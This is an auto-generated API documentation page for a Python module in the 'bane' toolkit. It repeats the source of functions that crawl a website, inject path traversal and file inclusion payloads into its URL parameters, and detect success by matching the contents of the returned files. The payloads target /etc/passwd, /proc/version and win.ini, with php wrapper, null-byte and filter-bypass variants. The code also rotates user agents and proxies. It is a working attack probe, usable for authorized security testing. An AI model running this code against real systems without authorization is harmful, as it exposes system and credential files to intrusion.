<body>
<main>
<article id="content">
<header>
<h1 class="title">Module <code>bane.scanners.vulnerabilities.path_traversal</code></h1>
</header>
<section id="section-intro">
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">from bane.scanners.vulnerabilities.utils import *




def path_traversal_check(
    u,
    php_wrapper=&#34;file&#34;,
    linux_file=0,
    null_byte=False,
    bypass=False,
    target_os=&#34;linux&#34;,
    proxy=None,
    proxies=None,
    timeout=10,
    user_agent=None,
    cookie=None,
    headers={}
):
    &#34;&#34;&#34;
    this function is for FI vulnerability test using a link&#34;&#34;&#34;
    linux_files = [&#34;{}proc{}version&#34;, &#34;{}etc{}passwd&#34;]
    if proxies:
        proxy = random.choice(proxies)
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    if cookie:
        heads = {&#34;User-Agent&#34;: us, &#34;Cookie&#34;: cookie}
    else:
        heads = {&#34;User-Agent&#34;: us}
    heads.update(
        {
            &#34;Referer&#34;: u,
            &#34;Origin&#34;: u.split(&#34;://&#34;)[0] + &#34;://&#34; + u.split(&#34;://&#34;)[1].split(&#34;/&#34;)[0],
        }
    )
    heads.update(headers)
    if &#34;=&#34; not in u:
        return (False, &#34;&#34;)
    else:
        if target_os.lower() == &#34;linux&#34;:
            l = linux_files[linux_file]
        else:
            l = &#34;c:{}windows{}win.ini&#34;
        if bypass == True:
            l = l.format(&#34;./&#34; * random.randint(1, 5), &#34;./&#34; * random.randint(1, 5))
        else:
            l = l.format(&#34;/&#34; * random.randint(1, 5), &#34;/&#34; * random.randint(1, 5))
        if php_wrapper:
            l = (
                &#34;&#34;.join(random.choice((str.upper, str.lower))(c) for c in php_wrapper)
                + &#34;://&#34;
                + l
            )
        if null_byte == True:
            l += &#34;%00&#34;
        try:
            r = requests.Session().get(
                u.format(l), headers=heads, proxies=proxy, timeout=timeout, verify=False
            )
            if (
                (
                    len(
                        re.findall(
                            r&#34;[a-zA-Z0-9_]*:[a-zA-Z0-9_]*:[\d]*:[\d]*:[a-zA-Z0-9_]*:/&#34;,
                            r.text,
                        )
                    )
                    &gt; 0
                )
                or (
                    all(
                        x in r.text
                        for x in [
                            &#34;; for 16-bit app support&#34;,
                            &#34;[fonts]&#34;,
                            &#34;[extensions]&#34;,
                            &#34;[mci extensions]&#34;,
                            &#34;[files]&#34;,
                            &#34;[Mail]&#34;,
                        ]
                    )
                    == True
                )
                or (all(x in r.text for x in [&#34;Linux version&#34;, &#34;(gcc version&#34;]) == True)
            ):
                return (True, r.url)
        except Exception as e:
            pass
    return (False, &#34;&#34;)


def path_traversal_urls(
    u,
    null_byte=False,
    bypass=False,
    target_os=&#34;linux&#34;,
    php_wrapper=&#34;file&#34;,
    proxy=None,
    proxies=None,
    timeout=10,
    user_agent=None,
    cookie=None,
    headers={}
):
    res = []
    if u.split(&#34;?&#34;)[0][-1] != &#34;/&#34; and &#34;.&#34; not in u.split(&#34;?&#34;)[0].rsplit(&#34;/&#34;, 1)[-1]:
        u = u.replace(&#34;?&#34;, &#34;/?&#34;)
    a = crawl(u, proxy=proxy, timeout=timeout, cookie=cookie, user_agent=user_agent)
    l = []
    d = a.values()
    for x in d:
        if len(x[3]) &gt; 0:
            l.append(x)
    o = []
    for x in l:
        ur = x[1]
        if ur.split(&#34;?&#34;)[0] not in o:
            o.append(ur.split(&#34;?&#34;)[0])
            if (
                ur.split(&#34;?&#34;)[0][-1] != &#34;/&#34;
                and &#34;.&#34; not in ur.split(&#34;?&#34;)[0].rsplit(&#34;/&#34;, 1)[-1]
            ):
                ur = ur.replace(&#34;?&#34;, &#34;/?&#34;)
            for y in x[3]:
                if valid_parameter(y[1]) == True:
                    trgt = ur.replace(y[0] + &#34;=&#34; + y[1], y[0] + &#34;={}&#34;)
                    q = path_traversal_check(
                        trgt,
                        null_byte=null_byte,
                        bypass=bypass,
                        linux_file=0,
                        target_os=&#34;linux&#34;,
                        php_wrapper=php_wrapper,
                        proxy=proxy,
                        proxies=proxies,
                        timeout=timeout,
                        cookie=cookie,
                        user_agent=user_agent,
                        headers=headers
                    )
                    if q[0] == True:
                        if q[1] not in res:
                            res.append(q[1])
                    else:
                        q = path_traversal_check(
                            trgt,
                            null_byte=null_byte,
                            bypass=bypass,
                            linux_file=1,
                            target_os=&#34;linux&#34;,
                            php_wrapper=php_wrapper,
                            proxy=proxy,
                            proxies=proxies,
                            timeout=timeout,
                            cookie=cookie,
                            user_agent=user_agent,
                            headers=headers
                        )
                        if q[0] == True:
                            if q[1] not in res:
                                res.append(q[1])
                        else:
                            q = path_traversal_check(
                                trgt,
                                null_byte=null_byte,
                                bypass=bypass,
                                php_wrapper=php_wrapper,
                                proxy=proxy,
                                proxies=proxies,
                                timeout=timeout,
                                cookie=cookie,
                                user_agent=user_agent,
                                target_os=&#34;windows&#34;,
                                headers=headers
                            )
                            if q[0] == True:
                                if q[1] not in res:
                                    res.append(q[1])
    return res

def path_traversal(
    u,
    max_pages=5,
    logs=True,
    null_byte=False,
    bypass=False,
    target_os=&#34;linux&#34;,
    php_wrapper=None,#&#34;file&#34;,
    proxy=None,
    proxies=None,
    timeout=10,
    user_agent=None,
    cookie=None,
    pages=[],
    headers={}
):
    l=[]
    if pages==[]:
        pages=spider_url(u,cookie=cookie,max_pages=max_pages,timeout=timeout,user_agent=user_agent,proxy=proxy)
    for x in pages:
        if logs==True:
            print(&#39;\n\nPage: {}\n&#39;.format(x))
        result=path_traversal_urls(x,
                            null_byte=null_byte,
                            bypass=bypass,
                            target_os=target_os,
                            php_wrapper=php_wrapper,
                            proxy=proxy,
                            proxies=proxies,
                            timeout=timeout,
                            user_agent=user_agent,
                            cookie=cookie,
                            headers=headers)
        if logs==True:
            for r in result:
                print(r)
        l.append({&#39;page&#39;:x,&#39;result&#39;:result})
    return  [x for x in l if x[&#39;result&#39;]!=[]]</code></pre>
</details>
</section>
<section>
</section>
<section>
</section>
<section>
<h2 class="section-title" id="header-functions">Functions</h2>
<dl>
<dt id="bane.scanners.vulnerabilities.path_traversal.path_traversal"><code class="name flex">
<span>def <span class="ident">path_traversal</span></span>(<span>u, max_pages=5, logs=True, null_byte=False, bypass=False, target_os='linux', php_wrapper=None, proxy=None, proxies=None, timeout=10, user_agent=None, cookie=None, pages=[], headers={})</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def path_traversal(
    u,
    max_pages=5,
    logs=True,
    null_byte=False,
    bypass=False,
    target_os=&#34;linux&#34;,
    php_wrapper=None,#&#34;file&#34;,
    proxy=None,
    proxies=None,
    timeout=10,
    user_agent=None,
    cookie=None,
    pages=[],
    headers={}
):
    l=[]
    if pages==[]:
        pages=spider_url(u,cookie=cookie,max_pages=max_pages,timeout=timeout,user_agent=user_agent,proxy=proxy)
    for x in pages:
        if logs==True:
            print(&#39;\n\nPage: {}\n&#39;.format(x))
        result=path_traversal_urls(x,
                            null_byte=null_byte,
                            bypass=bypass,
                            target_os=target_os,
                            php_wrapper=php_wrapper,
                            proxy=proxy,
                            proxies=proxies,
                            timeout=timeout,
                            user_agent=user_agent,
                            cookie=cookie,
                            headers=headers)
        if logs==True:
            for r in result:
                print(r)
        l.append({&#39;page&#39;:x,&#39;result&#39;:result})
    return  [x for x in l if x[&#39;result&#39;]!=[]]</code></pre>
</details>
</dd>
<dt id="bane.scanners.vulnerabilities.path_traversal.path_traversal_check"><code class="name flex">
<span>def <span class="ident">path_traversal_check</span></span>(<span>u, php_wrapper='file', linux_file=0, null_byte=False, bypass=False, target_os='linux', proxy=None, proxies=None, timeout=10, user_agent=None, cookie=None, headers={})</span>
</code></dt>
<dd>
<div class="desc"><p>this function is for FI vulnerability test using a link</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def path_traversal_check(
    u,
    php_wrapper=&#34;file&#34;,
    linux_file=0,
    null_byte=False,
    bypass=False,
    target_os=&#34;linux&#34;,
    proxy=None,
    proxies=None,
    timeout=10,
    user_agent=None,
    cookie=None,
    headers={}
):
    &#34;&#34;&#34;
    this function is for FI vulnerability test using a link&#34;&#34;&#34;
    linux_files = [&#34;{}proc{}version&#34;, &#34;{}etc{}passwd&#34;]
    if proxies:
        proxy = random.choice(proxies)
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    if cookie:
        heads = {&#34;User-Agent&#34;: us, &#34;Cookie&#34;: cookie}
    else:
        heads = {&#34;User-Agent&#34;: us}
    heads.update(
        {
            &#34;Referer&#34;: u,
            &#34;Origin&#34;: u.split(&#34;://&#34;)[0] + &#34;://&#34; + u.split(&#34;://&#34;)[1].split(&#34;/&#34;)[0],
        }
    )
    heads.update(headers)
    if &#34;=&#34; not in u:
        return (False, &#34;&#34;)
    else:
        if target_os.lower() == &#34;linux&#34;:
            l = linux_files[linux_file]
        else:
            l = &#34;c:{}windows{}win.ini&#34;
        if bypass == True:
            l = l.format(&#34;./&#34; * random.randint(1, 5), &#34;./&#34; * random.randint(1, 5))
        else:
            l = l.format(&#34;/&#34; * random.randint(1, 5), &#34;/&#34; * random.randint(1, 5))
        if php_wrapper:
            l = (
                &#34;&#34;.join(random.choice((str.upper, str.lower))(c) for c in php_wrapper)
                + &#34;://&#34;
                + l
            )
        if null_byte == True:
            l += &#34;%00&#34;
        try:
            r = requests.Session().get(
                u.format(l), headers=heads, proxies=proxy, timeout=timeout, verify=False
            )
            if (
                (
                    len(
                        re.findall(
                            r&#34;[a-zA-Z0-9_]*:[a-zA-Z0-9_]*:[\d]*:[\d]*:[a-zA-Z0-9_]*:/&#34;,
                            r.text,
                        )
                    )
                    &gt; 0
                )
                or (
                    all(
                        x in r.text
                        for x in [
                            &#34;; for 16-bit app support&#34;,
                            &#34;[fonts]&#34;,
                            &#34;[extensions]&#34;,
                            &#34;[mci extensions]&#34;,
                            &#34;[files]&#34;,
                            &#34;[Mail]&#34;,
                        ]
                    )
                    == True
                )
                or (all(x in r.text for x in [&#34;Linux version&#34;, &#34;(gcc version&#34;]) == True)
            ):
                return (True, r.url)
        except Exception as e:
            pass
    return (False, &#34;&#34;)</code></pre>
</details>
</dd>
<dt id="bane.scanners.vulnerabilities.path_traversal.path_traversal_urls"><code class="name flex">
<span>def <span class="ident">path_traversal_urls</span></span>(<span>u, null_byte=False, bypass=False, target_os='linux', php_wrapper='file', proxy=None, proxies=None, timeout=10, user_agent=None, cookie=None, headers={})</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def path_traversal_urls(
    u,
    null_byte=False,
    bypass=False,
    target_os=&#34;linux&#34;,
    php_wrapper=&#34;file&#34;,
    proxy=None,
    proxies=None,
    timeout=10,
    user_agent=None,
    cookie=None,
    headers={}
):
    res = []
    if u.split(&#34;?&#34;)[0][-1] != &#34;/&#34; and &#34;.&#34; not in u.split(&#34;?&#34;)[0].rsplit(&#34;/&#34;, 1)[-1]:
        u = u.replace(&#34;?&#34;, &#34;/?&#34;)
    a = crawl(u, proxy=proxy, timeout=timeout, cookie=cookie, user_agent=user_agent)
    l = []
    d = a.values()
    for x in d:
        if len(x[3]) &gt; 0:
            l.append(x)
    o = []
    for x in l:
        ur = x[1]
        if ur.split(&#34;?&#34;)[0] not in o:
            o.append(ur.split(&#34;?&#34;)[0])
            if (
                ur.split(&#34;?&#34;)[0][-1] != &#34;/&#34;
                and &#34;.&#34; not in ur.split(&#34;?&#34;)[0].rsplit(&#34;/&#34;, 1)[-1]
            ):
                ur = ur.replace(&#34;?&#34;, &#34;/?&#34;)
            for y in x[3]:
                if valid_parameter(y[1]) == True:
                    trgt = ur.replace(y[0] + &#34;=&#34; + y[1], y[0] + &#34;={}&#34;)
                    q = path_traversal_check(
                        trgt,
                        null_byte=null_byte,
                        bypass=bypass,
                        linux_file=0,
                        target_os=&#34;linux&#34;,
                        php_wrapper=php_wrapper,
                        proxy=proxy,
                        proxies=proxies,
                        timeout=timeout,
                        cookie=cookie,
                        user_agent=user_agent,
                        headers=headers
                    )
                    if q[0] == True:
                        if q[1] not in res:
                            res.append(q[1])
                    else:
                        q = path_traversal_check(
                            trgt,
                            null_byte=null_byte,
                            bypass=bypass,
                            linux_file=1,
                            target_os=&#34;linux&#34;,
                            php_wrapper=php_wrapper,
                            proxy=proxy,
                            proxies=proxies,
                            timeout=timeout,
                            cookie=cookie,
                            user_agent=user_agent,
                            headers=headers
                        )
                        if q[0] == True:
                            if q[1] not in res:
                                res.append(q[1])
                        else:
                            q = path_traversal_check(
                                trgt,
                                null_byte=null_byte,
                                bypass=bypass,
                                php_wrapper=php_wrapper,
                                proxy=proxy,
                                proxies=proxies,
                                timeout=timeout,
                                cookie=cookie,
                                user_agent=user_agent,
                                target_os=&#34;windows&#34;,
                                headers=headers
                            )
                            if q[0] == True:
                                if q[1] not in res:
                                    res.append(q[1])
    return res</code></pre>
</details>
</dd>
</dl>
</section>
<section>
</section>
</article>
<nav id="sidebar">
<h1>Index</h1>
<div class="toc">
<ul></ul>
</div>
<ul id="index">
<li><h3>Super-module</h3>
<ul>
<li><code><a title="bane.scanners.vulnerabilities" href="index.md">bane.scanners.vulnerabilities</a></code></li>
</ul>
</li>
<li><h3><a href="#header-functions">Functions</a></h3>
<ul class="">
<li><code><a title="bane.scanners.vulnerabilities.path_traversal.path_traversal" href="#bane.scanners.vulnerabilities.path_traversal.path_traversal">path_traversal</a></code></li>
<li><code><a title="bane.scanners.vulnerabilities.path_traversal.path_traversal_check" href="#bane.scanners.vulnerabilities.path_traversal.path_traversal_check">path_traversal_check</a></code></li>
<li><code><a title="bane.scanners.vulnerabilities.path_traversal.path_traversal_urls" href="#bane.scanners.vulnerabilities.path_traversal.path_traversal_urls">path_traversal_urls</a></code></li>
</ul>
</li>
</ul>
</nav>
</main>
<footer id="footer">
<p>Generated by <a href="https://pdoc3.github.io/pdoc" title="pdoc: Python API documentation generator"><cite>pdoc</cite> 0.10.0</a>.</p>
</footer>
</body>
</html>